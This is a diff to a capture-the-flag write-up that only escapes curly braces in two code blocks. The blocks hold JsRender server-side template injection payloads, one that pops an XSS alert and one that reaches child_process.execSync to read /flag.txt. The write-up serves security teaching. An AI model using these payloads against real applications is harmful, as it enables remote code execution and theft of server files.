@@ -383,7 +383,7 @@ In that blog, it has a JsRender SSTI RCE payload.
 > Finally, we can call this newly created function by adding parentheses to complete the attack:
 
 ```js
-{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
+\{\{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()\}\}
 ```
 
 ![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230320142208.png)
@@ -398,7 +398,7 @@ There is however one move obstacle to overcome, the “require” function is no
 
 **Armed with above information, we can register the following account in the username field to get the flag:**
 ```js
-{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()")()}}
+\{\{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()")()\}\}
 ```
 
 ![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230320142354.png)
